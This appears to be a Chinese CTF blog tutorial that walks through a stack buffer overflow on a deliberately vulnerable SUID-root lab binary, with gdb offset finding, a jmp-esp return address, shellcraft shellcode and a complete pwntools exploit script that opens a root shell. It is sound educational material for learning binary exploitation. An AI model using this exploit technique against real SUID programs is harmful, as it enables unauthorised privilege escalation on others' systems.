# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用


下载这个github库，进入05文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```

# SUID
然后将flag设置位只能root可读
```
chown root:root flag.txt
chown root:root server
```

设置程序位suid位
```
chmod 4655 server 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1c76d4cbe27544178fda731aae4570b3.png)





因为我们要模拟普通用户如何通过缓冲区溢出来读取root权限的内容，切换到普通用户，就没有权限查看flag文件了

![在这里插入图片描述](https://img-blog.csdnimg.cn/541772e87ea644ca80cb7fde761db447.png)


什么是setuid？
```
setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配
```
这么说起来有点绕，我们来举一个例子
```
一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了
```
演示
我们用user用户运行一个vim
然后新开一个窗口查看后台进程
```
ps -aux
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8bd8807dbb0e4b17b646422dd6f18fcf.png)

这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下靶机上的setuid文件看看


![在这里插入图片描述](https://img-blog.csdnimg.cn/059575182f2f4197a61d91d0066fdd65.png)

这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行
我们查看文件的权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/1abe340113d948e993e1832d310dde88.png)

r代表读，w代表写，x代表执行，那s是什么呢

```
s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的
```
当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的
我们的目标就是，破解这些文件然后拿到root权限读取flag

# 获取文件信息
首先我们登录普通用户，然后使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/60d5a596b90b47a295be7c488507316b.png)


可以看到，这个程序没有开启任何防护
从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```


查看程序源代码


![在这里插入图片描述](https://img-blog.csdnimg.cn/c9991b6780094c15ace8935e9d0846f0.png)

```
#include <stdio.h>

int secret_function() {
    asm("jmp %esp");    //汇编语言，意思是跳转到esp寄存器的地址里执行内容
}

void receive_feedback()
{
    char buffer[64];    ////定义了一个变量，名为buffer，有64个字节的缓冲区

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");   //输出字符
    gets(buffer);   //获取我们输入的内容
}

int main()
{
    setuid(0);    //保证程序以root身份运行
    setgid(0);    //保证程序以root身份运行

    receive_feedback();    //调用receive_feedback()函数

    return 0;
}
```
我们的目标就是溢出这个buffer，覆盖返回地址，写入shellcode，让程序跳转到esp寄存器里执行shellcode

关于程序的堆栈可以看这篇文章
```
https://courses.engr.illinois.edu/cs225/fa2022/resources/stack-heap/
```
# 动态调试

我们用gdb对程序进行动态调试
```
gdb server
```

输入命令cyclic就能获得测试用的字符串，然后运行程序
```
cyclic 100
run
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/7e3cbc03c01a4afaa4e30365997bf71a.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/e9912f10dd174b8b8bb9dccc10c3d205.png)

eip指针原来的返回地址被覆盖成了taaa，我们查一下taaa在刚刚生成的字符的第几个
```
cyclic -l taaa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/840ca837fa7d4175835e5f849ebf497b.png)
说明我们要覆盖eip原本的返回地址并控制，就需要76个字符+想让程序跳转执行的地址

现在我们写一个python小脚本来测试一下
```
python2 -c "print 'A'*76 + 'BBBB' + 'C'*100"
A是覆盖函数缓冲区空间的，B是我们要跳转的地址，C是我们要写入的shellcode字符
```
再次运行程序并输入


![在这里插入图片描述](https://img-blog.csdnimg.cn/514fb722d45642fd8ac822b1ce08a75f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c6fb50ae5df14f398f59c0cdfe8d6e49.png)


可以看到，eip的地址是B，堆栈里的内容就是C，我们需要让程序调用jmp esp那个汇编指令，然后程序就会执行堆栈里的内容

我们可以使用程序内的函数来跳转到堆栈里，也可以使用其他地址的指令来跳转到堆栈里，这两个方法都是可行的

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec72409f965f4ea8867507adbc067b73.png)

这里我们使用程序内的函数来跳转到堆栈里

![在这里插入图片描述](https://img-blog.csdnimg.cn/de4671e0af914c1b82844190b075b101.png)

然后就是我们要写入的shellcode了，这里可以使用shellcraft工具来帮助我们快速生成汇编代码的shellcode

我们要生成和程序对应的shellcode

![在这里插入图片描述](https://img-blog.csdnimg.cn/93c22031244149609e450bfcfbc8ccc3.png)

第一行可以看到程序是i386架构的，然后是linux二进制可执行文件，最后我们要生成sh交互命令行

```
shellcraft -l   //列出shellcode列表
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b512ed8095764e178edb86e4057fc326.png)

找到相符条件的shellcode，然后生成
```
shellcraft i386.linux.sh
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e479c76abfc54a809827664ecdea337f.png)

这里生成是以十六进制展现的，我们可以让他转换为汇编语言，好让我们可以看一下shellcode汇编代码
```
shellcraft i386.linux.sh -f a
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/39530c5bdeaa40c58b8334c5f69106b7.png)

这些就是我们生成的shllcode代码了，我们可以写一个pwntools脚本来完成利用
# nop指令
NOP指令，简单解释就是覆盖地址后程序不执行任何操作
# pwntools脚本
程序内跳转函数的地址


![在这里插入图片描述](https://img-blog.csdnimg.cn/9f3bbac17a344719b221b28e85c1e96f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/233dfd02d49b4bbc91925ac9f6e4135a.png)



无法打开flag文件，因为没有权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/342c7c1c85a2453da89ebe24a21a773d.png)

```
from pwn import *   //导入pwntools模块

exe = './server'   //要破解的文件名
elf = context.binary = ELF(exe, checksec=False)   //自动获取程序详细信息，如架构，操作系统
io = process('./server')   //启动程序
padding = 76   //覆盖eip原本的返回地址
shellcode = asm(shellcraft.sh())   //导入shellcode
payload = flat(
    asm('nop') * padding,   //覆盖eip原本的返回地址
    0x08049192,    //程序内跳转函数的地址
    asm('nop') * 16,   //不清楚堆栈需要溢出多少才能达到shellcode的地址，覆盖为nop指令，不执行任何操作，直到shellcode的位置
    shellcode
)   //构造paylaod
io.sendlineafter(b':',payload)  //发送payload
io.interactive()  //获得交互
```
运行脚本



![在这里插入图片描述](https://img-blog.csdnimg.cn/30fb7e59c1774ee68da8660c9f48e676.png)

成功拿到flag


